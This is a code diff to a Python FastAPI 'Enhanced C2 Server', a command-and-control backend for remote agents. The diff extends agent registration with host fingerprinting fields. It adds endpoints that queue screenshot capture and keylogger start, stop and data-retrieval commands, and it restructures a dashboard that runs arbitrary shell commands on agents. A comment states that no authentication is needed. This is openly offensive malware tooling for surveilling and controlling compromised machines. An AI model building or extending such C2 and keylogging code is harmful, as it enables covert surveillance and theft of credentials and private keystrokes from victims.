@@ -54,11 +54,23 @@ active_connections: List[WebSocket] = []
 # Pydantic models
 class AgentRegister(BaseModel):
     agent_id: str
+    display_name: Optional[str] = None
     hostname: str
     username: str
     os_info: str
     ip_address: str
     port: int
+    cpu_count: Optional[int] = None
+    memory_total: Optional[int] = None
+    disk_total: Optional[int] = None
+    python_version: Optional[str] = None
+    architecture: Optional[str] = None
+    machine: Optional[str] = None
+    processor: Optional[str] = None
+    boot_time: Optional[float] = None
+    pid: Optional[int] = None
+    cwd: Optional[str] = None
+    capabilities: Optional[Dict] = {}
 
 class CommandRequest(BaseModel):
     agent_id: str
@@ -111,331 +123,9 @@ async def simple_dashboard():
 
 @app.get("/simple", response_class=HTMLResponse)
 async def dashboard():
-    return """
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Enhanced C2 Server</title>
-        <style>
-            body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
-            .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-            .header { text-align: center; margin-bottom: 30px; }
-            .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
-            .stat-card { background: #007bff; color: white; padding: 20px; border-radius: 8px; text-align: center; }
-            .stat-number { font-size: 2em; font-weight: bold; }
-            .section { margin-bottom: 30px; }
-            .section h2 { border-bottom: 2px solid #007bff; padding-bottom: 10px; }
-            table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
-            th { background-color: #f8f9fa; }
-            .btn { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin: 5px; }
-            .btn:hover { background: #0056b3; }
-            .btn-danger { background: #dc3545; }
-            .btn-danger:hover { background: #c82333; }
-            .command-input { width: 70%; padding: 10px; margin-right: 10px; }
-            .log { background: #f8f9fa; padding: 15px; border-radius: 4px; max-height: 300px; overflow-y: auto; font-family: monospace; }
-            .command-result { margin-bottom: 15px; border-left: 3px solid #007bff; padding-left: 10px; }
-            .command-header { font-weight: bold; color: #007bff; margin-bottom: 5px; }
-            .command-output { 
-                background: #ffffff; 
-                padding: 10px; 
-                border-radius: 4px; 
-                border: 1px solid #dee2e6; 
-                white-space: pre-wrap; 
-                font-family: 'Courier New', monospace; 
-                font-size: 13px;
-                line-height: 1.4;
-            }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <div class="header">
-                <h1>Enhanced C2 Server Dashboard</h1>
-                <p>Command and Control Server Management Interface</p>
-            </div>
-            
-            <div class="stats">
-                <div class="stat-card">
-                    <div class="stat-number" id="agent-count">0</div>
-                    <div>Active Agents</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-number" id="command-count">0</div>
-                    <div>Commands Executed</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-number" id="success-rate">0%</div>
-                    <div>Success Rate</div>
-                </div>
-            </div>
-
-            <div class="section">
-                <h2>Active Agents</h2>
-                <table id="agents-table">
-                    <thead>
-                        <tr>
-                            <th>Agent ID</th>
-                            <th>Hostname</th>
-                            <th>Username</th>
-                            <th>OS</th>
-                            <th>IP Address</th>
-                            <th>Last Seen</th>
-                            <th>Status</th>
-                            <th>Actions</th>
-                        </tr>
-                    </thead>
-                    <tbody id="agents-tbody">
-                    </tbody>
-                </table>
-            </div>
-
-            <div class="section">
-                <h2>Command Execution</h2>
-                <div>
-                    <select id="agent-select" style="padding: 10px; margin-right: 10px;">
-                        <option value="">Select Agent</option>
-                    </select>
-                    <input type="text" id="command-input" class="command-input" placeholder="Enter command...">
-                    <button class="btn" onclick="executeCommand()">Execute</button>
-                    <button class="btn" onclick="refreshDashboard()" style="background: #28a745;">Refresh</button>
-                </div>
-                <div id="command-results" class="log" style="margin-top: 20px;"></div>
-            </div>
-
-            <div class="section">
-                <h2>System Logs</h2>
-                <div id="system-logs" class="log"></div>
-            </div>
-        </div>
-
-        <script>
-            let ws = new WebSocket(`ws://${window.location.host}/ws`);
-            
-            ws.onmessage = function(event) {
-                const data = JSON.parse(event.data);
-                updateDashboard(data);
-            };
-
-            function updateDashboard(data) {
-                if (data.type === 'agent_update') {
-                    updateAgentsTable(data.agents);
-                    updateStats(data);
-                } else if (data.type === 'command_result') {
-                    addCommandResult(data.result);
-                } else if (data.type === 'log') {
-                    addSystemLog(data.message);
-                }
-            }
-
-            function updateAgentsTable(agents) {
-                console.log('Updating agents table with:', agents);
-                const tbody = document.getElementById('agents-tbody');
-                const select = document.getElementById('agent-select');
-                
-                if (!tbody || !select) {
-                    console.error('Could not find agents table or select element');
-                    return;
-                }
-                
-                tbody.innerHTML = '';
-                select.innerHTML = '<option value="">Select Agent</option>';
-                
-                const agentValues = Object.values(agents);
-                console.log('Processing', agentValues.length, 'agents');
-                
-                agentValues.forEach(agent => {
-                    console.log('Adding agent:', agent.agent_id);
-                    const row = tbody.insertRow();
-                    row.innerHTML = `
-                        <td>${agent.agent_id}</td>
-                        <td>${agent.hostname}</td>
-                        <td>${agent.username}</td>
-                        <td>${agent.os_info}</td>
-                        <td>${agent.ip_address}</td>
-                        <td>${new Date(agent.last_seen).toLocaleString()}</td>
-                        <td><span style="color: green;">Online</span></td>
-                        <td>
-                            <button class="btn btn-danger" onclick="removeAgent('${agent.agent_id}')">Remove</button>
-                        </td>
-                    `;
-                    
-                    const option = document.createElement('option');
-                    option.value = agent.agent_id;
-                    option.textContent = agent.agent_id;
-                    select.appendChild(option);
-                });
-                
-                console.log('Agents table updated successfully');
-            }
-
-            function updateStats(data) {
-                document.getElementById('agent-count').textContent = Object.keys(data.agents || {}).length;
-                document.getElementById('command-count').textContent = data.command_count || 0;
-                document.getElementById('success-rate').textContent = data.success_rate || '0%';
-            }
-
-            function executeCommand() {
-                const agentId = document.getElementById('agent-select').value;
-                const command = document.getElementById('command-input').value;
-                
-                if (!agentId || !command) {
-                    alert('Please select an agent and enter a command');
-                    return;
-                }
-                
-                fetch('/api/commands/execute', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        agent_id: agentId,
-                        command: command,
-                        command_type: 'shell'
-                    })
-                });
-                
-                document.getElementById('command-input').value = '';
-            }
-
-            function addCommandResult(result) {
-                const log = document.getElementById('command-results');
-                const timestamp = new Date().toLocaleString();
-                
-                // Format the result to preserve line breaks and formatting
-                const formattedResult = result.result
-                    .replace(/\n/g, '<br>')  // Convert newlines to HTML line breaks
-                    .replace(/\t/g, '&nbsp;&nbsp;&nbsp;&nbsp;')  // Convert tabs to spaces
-                    .replace(/ /g, '&nbsp;');  // Preserve spaces
-                
-                log.innerHTML += `<div class="command-result">
-                    <div class="command-header">[${timestamp}] Agent: ${result.agent_id}</div>
-                    <div class="command-output">${formattedResult}</div>
-                </div>`;
-                log.scrollTop = log.scrollHeight;
-            }
-
-            function addSystemLog(message) {
-                const log = document.getElementById('system-logs');
-                const timestamp = new Date().toLocaleString();
-                log.innerHTML += `<div>[${timestamp}] ${message}</div>`;
-                log.scrollTop = log.scrollHeight;
-            }
-
-            function fetchCommandResults() {
-                // Fetch command results for all connected agents
-                const agentSelect = document.getElementById('agent-select');
-                if (agentSelect.value) {
-                    fetch(`/api/commands/${agentSelect.value}/results`)
-                        .then(response => response.json())
-                        .then(data => {
-                            const log = document.getElementById('command-results');
-                            const existingResults = log.querySelectorAll('.command-result').length;
-                            const newResults = data.results.slice(existingResults);
-                            
-                            newResults.forEach(result => {
-                                addCommandResult(result);
-                            });
-                        })
-                        .catch(error => console.error('Error fetching results:', error));
-                }
-            }
-
-            // Simple initialization - no complex function needed
-
-            function loadAgents() {
-                console.log('Loading agents...');
-                fetch('/api/agents')
-                    .then(response => {
-                        console.log('Agents response status:', response.status);
-                        return response.json();
-                    })
-                    .then(data => {
-                        console.log('Agents data:', data);
-                        updateAgentsTable(data.agents);
-                        updateStats({
-                            agents: data.agents,
-                            command_count: 0,
-                            success_rate: '100%'
-                        });
-                    })
-                    .catch(error => console.error('Error loading agents:', error));
-            }
-
-            function loadCommandResults(agentId) {
-                fetch(`/api/commands/${agentId}/results`)
-                    .then(response => response.json())
-                    .then(data => {
-                        const log = document.getElementById('command-results');
-                        log.innerHTML = ''; // Clear existing results
-                        
-                        data.results.forEach(result => {
-                            addCommandResult(result);
-                        });
-                    })
-                    .catch(error => console.error('Error loading command results:', error));
-            }
-
-            // Simple initialization - load data immediately when page loads
-            window.addEventListener('load', function() {
-                console.log('Dashboard loaded, loading agents...');
-                loadAgents();
-            });
-
-            // Fetch command results every 2 seconds
-            setInterval(fetchCommandResults, 2000);
-
-            function removeAgent(agentId) {
-                if (confirm('Are you sure you want to remove this agent?')) {
-                    fetch(`/api/agents/${agentId}`, { method: 'DELETE' });
-                }
-            }
-
-            // Handle agent selection change
-            function onAgentChange() {
-                const agentSelect = document.getElementById('agent-select');
-                if (agentSelect.value) {
-                    loadCommandResults(agentSelect.value);
-                } else {
-                    // Clear results if no agent selected
-                    document.getElementById('command-results').innerHTML = '';
-                }
-            }
-
-            // Add event listener for agent selection change when page loads
-            window.addEventListener('load', function() {
-                const agentSelect = document.getElementById('agent-select');
-                if (agentSelect) {
-                    agentSelect.addEventListener('change', onAgentChange);
-                }
-            });
-
-            // Manual refresh function
-            function refreshDashboard() {
-                console.log('Refreshing dashboard...');
-                
-                // Show loading indicator
-                const refreshBtn = event.target;
-                const originalText = refreshBtn.textContent;
-                refreshBtn.textContent = 'Refreshing...';
-                refreshBtn.disabled = true;
-                
-                loadAgents();
-                const agentSelect = document.getElementById('agent-select');
-                if (agentSelect.value) {
-                    loadCommandResults(agentSelect.value);
-                }
-                
-                // Reset button after a short delay
-                setTimeout(() => {
-                    refreshBtn.textContent = originalText;
-                    refreshBtn.disabled = false;
-                }, 1000);
-            }
-        </script>
-    </body>
-    </html>
-    """
-
+   with open("static/simple_dashboard.html", "r") as f:
+        return HTMLResponse(content=f.read())
+        
 # No authentication endpoints needed
 
 # Agent management endpoints
@@ -444,11 +134,23 @@ async def register_agent(agent: AgentRegister):
     agent_id = agent.agent_id
     agent_data = {
         "agent_id": agent_id,
+        "display_name": agent.display_name or agent_id,
         "hostname": agent.hostname,
         "username": agent.username,
         "os_info": agent.os_info,
         "ip_address": agent.ip_address,
         "port": agent.port,
+        "cpu_count": agent.cpu_count,
+        "memory_total": agent.memory_total,
+        "disk_total": agent.disk_total,
+        "python_version": agent.python_version,
+        "architecture": agent.architecture,
+        "machine": agent.machine,
+        "processor": agent.processor,
+        "boot_time": agent.boot_time,
+        "pid": agent.pid,
+        "cwd": agent.cwd,
+        "capabilities": agent.capabilities or {},
         "last_seen": datetime.utcnow().isoformat(),
         "status": "online"
     }
@@ -457,7 +159,8 @@ async def register_agent(agent: AgentRegister):
     commands[agent_id] = []
     command_results[agent_id] = []
     
-    logger.info("Agent {} registered from {}".format(agent_id, agent.ip_address))
+    logger.info("Agent {} registered from {} with capabilities: {}".format(
+        agent_id, agent.ip_address, agent.capabilities))
     
     # Notify dashboard
     await manager.broadcast(json.dumps({
@@ -578,6 +281,19 @@ async def get_command_results(agent_id: str):
     
     return {"results": command_results.get(agent_id, [])}
 
+@app.delete("/api/commands/{agent_id}/results")
+async def clear_command_results(agent_id: str):
+    if agent_id not in agents:
+        raise HTTPException(status_code=404, detail="Agent not found")
+    
+    command_results[agent_id] = []
+    logger.info("Cleared command results for agent {}".format(agent_id))
+    await manager.broadcast(json.dumps({
+        "type": "command_results_cleared",
+        "agent_id": agent_id
+    }))
+    return {"message": "Command results cleared"}
+
 # File transfer endpoints
 @app.post("/api/files/upload")
 async def upload_file(file: UploadFile = File(...)):
@@ -624,6 +340,198 @@ async def list_files():
             })
     
     return {"upload_files": upload_files, "download_files": download_files}
+
+
+# Enhanced C2 endpoints for advanced features
+@app.post("/api/commands/screenshot")
+async def take_screenshot(command_req: CommandRequest):
+    """Queue a screenshot command for an agent that supports it"""
+    if command_req.agent_id not in agents:
+        raise HTTPException(status_code=404, detail="Agent not found")
+    
+    # Check if agent supports screenshot capability
+    agent_caps = agents[command_req.agent_id].get("capabilities", {})
+    if not agent_caps.get("screenshot", False):
+        raise HTTPException(status_code=400, detail="Agent does not support screenshots")
+    
+    # Create the screenshot command
+    command_id = str(uuid.uuid4())
+    command_data = {
+        "command_id": command_id,
+        "agent_id": command_req.agent_id,
+        "command": "SCREENSHOT",
+        "command_type": "special",
+        "timestamp": datetime.utcnow().isoformat(),
+        "status": "pending"
+    }
+    
+    commands[command_req.agent_id].append(command_data)
+    
+    logger.info("Screenshot command {} queued for agent {}".format(command_id, command_req.agent_id))
+    
+    # Notify dashboard
+    await manager.broadcast(json.dumps({
+        "type": "log",
+        "message": "Screenshot command queued for agent {}".format(command_req.agent_id)
+    }))
+    
+    return {"message": "Screenshot command queued successfully", "command_id": command_id}
+
+
+@app.post("/api/commands/keylogger/start")
+async def start_keylogger(agent_id: str):
+    """Start keylogger on agent that supports it"""
+    if agent_id not in agents:
+        raise HTTPException(status_code=404, detail="Agent not found")
+    
+    # Check if agent supports keylogger capability
+    agent_caps = agents[agent_id].get("capabilities", {})
+    if not agent_caps.get("keylogger", False):
+        raise HTTPException(status_code=400, detail="Agent does not support keylogger")
+    
+    # Create the keylogger start command
+    command_id = str(uuid.uuid4())
+    command_data = {
+        "command_id": command_id,
+        "agent_id": agent_id,
+        "command": "KEYLOG_START",
+        "command_type": "special",
+        "timestamp": datetime.utcnow().isoformat(),
+        "status": "pending"
+    }
+    
+    commands[agent_id].append(command_data)
+    
+    logger.info("Keylogger start command {} queued for agent {}".format(command_id, agent_id))
+    
+    # Notify dashboard
+    await manager.broadcast(json.dumps({
+        "type": "log",
+        "message": "Keylogger start command queued for agent {}".format(agent_id)
+    }))
+    
+    return {"message": "Keylogger start command queued successfully", "command_id": command_id}
+
+
+@app.post("/api/commands/keylogger/stop")
+async def stop_keylogger(agent_id: str):
+    """Stop keylogger on agent that supports it"""
+    if agent_id not in agents:
+        raise HTTPException(status_code=404, detail="Agent not found")
+    
+    # Check if agent supports keylogger capability
+    agent_caps = agents[agent_id].get("capabilities", {})
+    if not agent_caps.get("keylogger", False):
+        raise HTTPException(status_code=400, detail="Agent does not support keylogger")
+    
+    # Create the keylogger stop command
+    command_id = str(uuid.uuid4())
+    command_data = {
+        "command_id": command_id,
+        "agent_id": agent_id,
+        "command": "KEYLOG_STOP",
+        "command_type": "special",
+        "timestamp": datetime.utcnow().isoformat(),
+        "status": "pending"
+    }
+    
+    commands[agent_id].append(command_data)
+    
+    logger.info("Keylogger stop command {} queued for agent {}".format(command_id, agent_id))
+    
+    # Notify dashboard
+    await manager.broadcast(json.dumps({
+        "type": "log",
+        "message": "Keylogger stop command queued for agent {}".format(agent_id)
+    }))
+    
+    return {"message": "Keylogger stop command queued successfully", "command_id": command_id}
+
+
+@app.post("/api/commands/keylogger/data")
+async def get_keylogger_data(agent_id: str):
+    """Get keylogger data from agent"""
+    if agent_id not in agents:
+        raise HTTPException(status_code=404, detail="Agent not found")
+    
+    # Check if agent supports keylogger capability
+    agent_caps = agents[agent_id].get("capabilities", {})
+    if not agent_caps.get("keylogger", False):
+        raise HTTPException(status_code=400, detail="Agent does not support keylogger")
+    
+    # Create the keylogger data command
+    command_id = str(uuid.uuid4())
+    command_data = {
+        "command_id": command_id,
+        "agent_id": agent_id,
+        "command": "KEYLOG_DATA",
+        "command_type": "special",
+        "timestamp": datetime.utcnow().isoformat(),
+        "status": "pending"
+    }
+    
+    commands[agent_id].append(command_data)
+    
+    logger.info("Keylogger data command {} queued for agent {}".format(command_id, agent_id))
+    
+    # Notify dashboard
+    await manager.broadcast(json.dumps({
+        "type": "log",
+        "message": "Keylogger data command queued for agent {}".format(agent_id)
+    }))
+    
+    return {"message": "Keylogger data command queued successfully", "command_id": command_id}
+
+
+@app.get("/api/agents/{agent_id}/info")
+async def get_agent_info(agent_id: str):
+    """Get comprehensive agent system information"""
+    if agent_id not in agents:
+        raise HTTPException(status_code=404, detail="Agent not found")
+    
+    agent_info = agents[agent_id]
+    
+    return {
+        "agent_id": agent_info["agent_id"],
+        "display_name": agent_info["display_name"],
+        "hostname": agent_info["hostname"],
+        "username": agent_info["username"],
+        "os_info": agent_info["os_info"],
+        "ip_address": agent_info["ip_address"],
+        "cpu_count": agent_info["cpu_count"],
+        "memory_total": agent_info["memory_total"],
+        "disk_total": agent_info["disk_total"],
+        "python_version": agent_info["python_version"],
+        "architecture": agent_info["architecture"],
+        "machine": agent_info["machine"],
+        "processor": agent_info["processor"],
+        "boot_time": agent_info["boot_time"],
+        "pid": agent_info["pid"],
+        "cwd": agent_info["cwd"],
+        "capabilities": agent_info["capabilities"],
+        "last_seen": agent_info["last_seen"],
+        "status": agent_info["status"]
+    }
+
+
+@app.get("/api/agents/enhanced")
+async def get_enhanced_agents():
+    """Get list of agents with enhanced information"""
+    enhanced_agents = {}
+    for agent_id, agent_data in agents.items():
+        enhanced_agents[agent_id] = {
+            "agent_id": agent_data["agent_id"],
+            "display_name": agent_data["display_name"],
+            "hostname": agent_data["hostname"],
+            "username": agent_data["username"],
+            "os_info": agent_data["os_info"],
+            "ip_address": agent_data["ip_address"],
+            "capabilities": agent_data["capabilities"],
+            "last_seen": agent_data["last_seen"],
+            "status": agent_data["status"]
+        }
+    
+    return {"enhanced_agents": enhanced_agents}
 
 # WebSocket endpoint for real-time updates
 @app.websocket("/ws")
